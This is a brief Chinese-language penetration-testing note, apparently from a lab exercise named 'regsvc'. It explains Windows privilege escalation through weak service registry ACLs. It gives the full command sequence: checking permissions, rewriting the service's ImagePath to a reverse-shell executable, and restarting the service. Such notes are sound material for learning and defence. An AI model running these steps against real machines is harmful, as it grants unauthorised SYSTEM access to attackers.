# 注册表配置错误-弱注册表权限

原理：Windows 注册表存储每个服务的条目。由于注册表项可以有 ACL，**如果 ACL 配置错误**，虽然我们不能直接修改服务，**但是我们也有可能修改服务的配置。**

利用方式：**如果未正确设置用户和组的权限**并允许访问服务的注册表项，那么我们可以**更改服务 binPath 以指向其控制下的不同可执行文件**。当服务启动或重新启动时，我们的程序将执行

## 案例：regsvc

利用方式：1.删除现有的 exe 文件并替换为我们的反向shell
                  2.将注册表路径本身修改为反向shell文件

```bash
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc  查看是否具有注册表的读写权限
sc qc regsvc //查看以何种权限运行
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f  //覆盖 ImagePath 注册表项以指向您创建的 reverse.exe 可执行文件
net start regsvc 手动重启服务
```